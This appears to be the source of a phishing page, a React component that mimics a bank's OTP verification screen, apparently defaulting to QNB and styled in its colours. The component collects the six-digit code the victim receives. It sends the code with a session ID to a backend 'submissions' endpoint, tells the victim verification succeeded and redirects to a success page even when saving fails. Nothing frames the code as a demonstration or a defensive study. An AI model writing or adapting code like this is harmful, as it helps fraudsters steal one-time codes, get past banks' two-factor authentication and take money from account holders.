import { useState } from "react";
import { useLocation, useSearch } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";
import { toast } from "sonner";

export default function Otp() {
  const [, setLocation] = useLocation();
  const search = useSearch();
  const params = new URLSearchParams(search);
  const bank = params.get("bank") || "qnb";
  const { language, setLanguage } = useLanguage();
  const sessionId = localStorage.getItem("sessionId") || "";

  const isArabic = language === "ar";

  const [otp, setOtp] = useState("");
  const submitOtpMutation = trpc.submissions.submitOtp.useMutation();

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^0-9]/g, "").slice(0, 6);
    setOtp(value);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length !== 6) {
      toast.error("يجب أن يكون الرمز 6 أرقام");
      return;
    }
    try {
      await submitOtpMutation.mutateAsync({
        sessionId,
        otpCode: otp,
        otpType: "standard",
      });
      toast.success("تم التحقق بنجاح");
    } catch (error) {
      console.error("Error saving OTP in DB, continuing anyway:", error);
    }
    setLocation(`/success?bank=${bank}&session=${sessionId}`);
  };

  return (
    <div className="page-wrapper">
      <style>{`
        .page-wrapper { font-family: sans-serif; background-color: #f4f4f4; margin: 0; padding-top: 70px; display: flex; flex-direction: column; min-height: 100vh; }
        .header { position: fixed; top: 0; width: 100%; display: flex; justify-content: space-between; align-items: center; padding: 10px 25px; background-color: #ffffff; border-bottom: 2px solid #8C0032; z-index: 1000; box-sizing: border-box; }
        .logo { height: 80px; width: auto; object-fit: contain; background-color: white; padding: 5px; }
        .menu-icon { font-size: 28px; color: #8C0032; cursor: pointer; }
        .lang-btn { background: transparent; color: #8C0032; border: 2px solid #8C0032; padding: 5px 15px; border-radius: 5px; font-weight: bold; cursor: pointer; }
        
        .container { padding: 40px 20px; flex: 1; text-align: center; }
        .otp-box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        
        .otp-input { width: 100%; padding: 20px; border: 2px solid #ddd; border-radius: 8px; font-size: 24px; text-align: center; font-weight: bold; margin: 20px 0; box-sizing: border-box; letter-spacing: 5px; }
        .otp-input:focus { border-color: #8C0032; outline: none; }
        
        .submit-btn { background: #8C0032; color: white; padding: 15px; width: 100%; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; }
        .footer-image { width: 100%; display: block; margin-top: 20px; }
      `}</style>
      <header className="header">
        <div className="menu-icon">&#9776;</div>
        <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663834255146/jNmGelCTuaBjjTzY.jpg" className="logo" />
        <a href="otp_en.html" className="lang-btn" style={{ textDecoration: "none" }}>
          English
        </a>
      </header>

      <div className="container">
        <div className="otp-box">
          <h2>أدخل رمز التحقق (OTP)</h2>
          <p>تم إرسال رمز التحقق إلى رقم هاتفك المسجل</p>
          <form onSubmit={handleSubmit}>
            <input
              type="text"
              className="otp-input"
              placeholder="------"
              maxLength={6}
              value={otp}
              onChange={handleOtpChange}
              required
            />
            <button type="submit" className="submit-btn">
              تأكيد الرمز
            </button>
          </form>
        </div>
      </div>

      <img src="https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg" className="footer-image" alt="Footer" />
    </div>
  );
}
